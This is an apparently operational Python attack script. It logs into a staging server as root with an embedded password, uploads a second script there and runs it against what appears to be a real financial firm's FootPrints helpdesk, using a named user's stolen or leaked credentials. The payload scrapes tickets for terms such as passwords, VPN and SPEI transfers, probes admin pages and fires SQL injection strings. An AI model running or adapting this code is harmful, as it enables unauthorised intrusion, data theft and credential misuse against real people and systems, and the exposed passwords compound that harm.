import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

PAO = "https://pao.findep.com.mx"

# LOGIN
r_login = s.post(f"{PAO}/MRcgi/MRlogin.pl",
    data={"USER": "bmendezar", "PASSWORD": "Pao1234+", "USERID": "bmendezar",
          "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
    timeout=20, allow_redirects=True)

mrp = re.search(r'NAME=MRP\s+VALUE="([^"]+)"', r_login.text)
MRP = mrp.group(1) if mrp else ""
sys.stdout.write(f"MRP: {MRP}\n\n")

# Session params for all requests
SP = f"MRP={MRP}&PROJECTID=50&USER=bmendezar"

# ========================================
# 1. GET HOMEPAGE (TICKET LIST)
# ========================================
sys.stdout.write("=" * 60 + "\n=== HOMEPAGE / TICKET LIST ===\n" + "=" * 60 + "\n\n")

r_home = s.get(f"{PAO}/MRcgi/MRhomepage.pl?{SP}&WRITECACHE=1&CUSTUSER=on", timeout=30)
sys.stdout.write(f"Homepage: [{r_home.status_code}] ({len(r_home.text)}b)\n\n")

# Extract ticket numbers and titles
tickets = re.findall(r'MRticketBody\.pl\?(?:.*?)ESSION=(\d+)', r_home.text)
sys.stdout.write(f"Ticket IDs via ESSION: {tickets[:20]}\n")

# More robust ticket extraction
ticket_links = re.findall(r'MRticketBody\.pl\?([^"\']+)', r_home.text)
sys.stdout.write(f"Ticket links: {len(ticket_links)}\n")
for tl in ticket_links[:10]:
    sys.stdout.write(f"  {tl[:100]}\n")

# Extract from table rows
table_data = re.findall(r'<td[^>]*class="[^"]*issuefield[^"]*"[^>]*>(.*?)</td>', r_home.text, re.S)
sys.stdout.write(f"\nIssue fields: {len(table_data)}\n")
for td in table_data[:30]:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    if clean:
        sys.stdout.write(f"  {clean[:100]}\n")

# Extract MRnumbers (ticket IDs)
mrnumbers = re.findall(r'MESSION=(\d+)', r_home.text)
if not mrnumbers:
    mrnumbers = re.findall(r'SESSION=(\d+)', r_home.text)
if not mrnumbers:
    mrnumbers = re.findall(r'(?:ticket|issue|ID)[^\d]*(\d{4,})', r_home.text)

sys.stdout.write(f"\nMESSION/ticket IDs: {mrnumbers[:20]}\n")

# Get raw HTML snippet with ticket info
sys.stdout.write(f"\n--- RAW: Search for 'ticket' context ---\n")
for m in re.finditer(r'ticket|reporte|solicitud|issue', r_home.text, re.I):
    start = max(0, m.start()-50)
    end = min(len(r_home.text), m.end()+200)
    chunk = r_home.text[start:end]
    clean = re.sub(r'<[^>]+>', ' ', chunk).strip()
    clean = re.sub(r'\s+', ' ', clean)
    sys.stdout.write(f"  ...{clean[:200]}...\n")
    if len(sys.stdout.getvalue() if hasattr(sys.stdout, 'getvalue') else '') > 5000:
        break
sys.stdout.flush()


# ========================================
# 2. SEARCH TICKETS (ALL)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SEARCH ALL TICKETS ===\n" + "=" * 60 + "\n\n")

# Try search
r_search = s.get(f"{PAO}/MRcgi/MRquickSearch.pl?{SP}&SEARCHTERMS=*&SEARCHTYPE=quick", timeout=30)
sys.stdout.write(f"Quick search *: [{r_search.status_code}] ({len(r_search.text)}b)\n")

title = re.search(r'<title>(.*?)</title>', r_search.text[:3000], re.I)
sys.stdout.write(f"Title: {title.group(1)[:60] if title else 'N/A'}\n\n")

# Try search for SPEI, network, server, password
for term in ["SPEI", "server", "password", "clave", "VPN", "red", "dispersion", "transferencia", "produccion", "base de datos"]:
    r_s = s.get(f"{PAO}/MRcgi/MRquickSearch.pl?{SP}&SEARCHTERMS={term}&SEARCHTYPE=quick", timeout=15)
    # Count results
    result_count = r_s.text.count("MRticketBody")
    sys.stdout.write(f"  '{term}': [{r_s.status_code}] ({len(r_s.text)}b) tickets={result_count}\n")
    
    if result_count > 0 and result_count < 20:
        # Extract ticket IDs from results
        found_tix = re.findall(r'MRticketBody\.pl\?([^"\']+)', r_s.text)
        for ft in found_tix[:5]:
            sys.stdout.write(f"    -> {ft[:80]}\n")
    sys.stdout.flush()


# ========================================
# 3. READ INDIVIDUAL TICKETS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== READ TICKETS ===\n" + "=" * 60 + "\n\n")

# Try ticket IDs from 1 to 20
for tid in range(1, 21):
    try:
        r_t = s.get(f"{PAO}/MRcgi/MRticketBody.pl?{SP}&ESSION={tid}", timeout=10)
        if r_t.status_code == 200 and len(r_t.text) > 1000:
            title_t = re.search(r'<title>(.*?)</title>', r_t.text[:3000], re.I)
            has_content = "issuefield" in r_t.text or "description" in r_t.text.lower()
            sys.stdout.write(f"  Ticket {tid}: [{r_t.status_code}] ({len(r_t.text)}b) '{title_t.group(1)[:40] if title_t else 'N/A'}' content={has_content}\n")
            
            if has_content:
                # Extract issue description
                desc = re.findall(r'class="[^"]*description[^"]*"[^>]*>(.*?)</(?:td|div)', r_t.text, re.S|re.I)
                for d in desc[:3]:
                    clean_d = re.sub(r'<[^>]+>', '', d).strip()[:200]
                    sys.stdout.write(f"    Desc: {clean_d}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 4. ADMIN ACCESS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== ADMIN ACCESS ===\n" + "=" * 60 + "\n\n")

admin_pages = [
    f"/MRcgi/MRadmin.pl?{SP}",
    f"/MRcgi/MRconfigure.pl?{SP}",
    f"/MRcgi/MRuserManager.pl?{SP}",
    f"/MRcgi/MRuserList.pl?{SP}",
    f"/MRcgi/MRagentList.pl?{SP}",
    f"/MRcgi/MRprojectAdmin.pl?{SP}",
    f"/MRcgi/MRworkspacelist.pl?{SP}",
]

for ap in admin_pages:
    try:
        r_a = s.get(f"{PAO}{ap}", timeout=10)
        title = re.search(r'<title>(.*?)</title>', r_a.text[:3000], re.I)
        has_login = "MRlogin" in r_a.text[:3000]
        has_error = "Error" in (title.group(1) if title else "")
        t = title.group(1)[:50] if title else "N/A"
        tag = " (login)" if has_login else (" (error)" if has_error else " ***")
        sys.stdout.write(f"  [{r_a.status_code}] ({len(r_a.text):>6}b) {ap.split('?')[0]:<40} '{t}'{tag}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 5. SQL INJECTION TEST (CVE-2015-2098)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SQL INJECTION TEST ===\n" + "=" * 60 + "\n\n")

# FootPrints 11.x has known SQLi in search and other parameters
sqli_tests = [
    # In SEARCHTERMS
    f"/MRcgi/MRquickSearch.pl?{SP}&SEARCHTERMS=' OR '1'='1&SEARCHTYPE=quick",
    f"/MRcgi/MRquickSearch.pl?{SP}&SEARCHTERMS=1' UNION SELECT 1--&SEARCHTYPE=quick",
    # In PROJECTID
    f"/MRcgi/MRhomepage.pl?MRP={MRP}&PROJECTID=50' OR '1'='1&USER=bmendezar",
    # In ESSION (ticket ID)
    f"/MRcgi/MRticketBody.pl?{SP}&ESSION=1' OR '1'='1",
    # In USER
    f"/MRcgi/MRhomepage.pl?MRP={MRP}&PROJECTID=50&USER=bmendezar' OR '1'='1",
]

for sqli in sqli_tests:
    try:
        r_sqli = s.get(f"{PAO}{sqli}", timeout=10)
        is_error = "error" in r_sqli.text[:5000].lower() or "sql" in r_sqli.text[:5000].lower()
        diff = len(r_sqli.text) - 177558  # Compare to normal homepage
        sys.stdout.write(f"  [{r_sqli.status_code}] ({len(r_sqli.text):>6}b, diff={diff:+d}) ")
        sys.stdout.write(f"{'SQL ERROR!' if is_error else 'normal'} — {sqli.split('?')[0]}\n")
        
        if is_error:
            # Extract error message
            err = re.search(r'(?:error|sql|syntax)[^<]{0,300}', r_sqli.text, re.I)
            if err:
                sys.stdout.write(f"    ERR: {err.group()[:200]}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 6. CREATE TICKET (TEST)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CREATE TICKET PAGE ===\n" + "=" * 60 + "\n\n")

r_create = s.get(f"{PAO}/MRcgi/MRcreate.pl?{SP}", timeout=10)
title = re.search(r'<title>(.*?)</title>', r_create.text[:3000], re.I)
sys.stdout.write(f"Create: [{r_create.status_code}] ({len(r_create.text)}b) '{title.group(1)[:50] if title else 'N/A'}'\n")

# Check what fields are available
fields = re.findall(r'name="([^"]+)"', r_create.text)
sys.stdout.write(f"Form fields ({len(fields)}): {fields[:30]}\n")

# Extract service catalog
categories = re.findall(r'<option[^>]*value="([^"]+)"[^>]*>(.*?)</option>', r_create.text, re.I)
sys.stdout.write(f"\nCategories/services ({len(categories)}):\n")
for val, label in categories[:30]:
    clean = re.sub(r'<[^>]+>', '', label).strip()
    sys.stdout.write(f"  {val}: {clean[:60]}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_mine.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_mine.py 2>&1', timeout=180)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
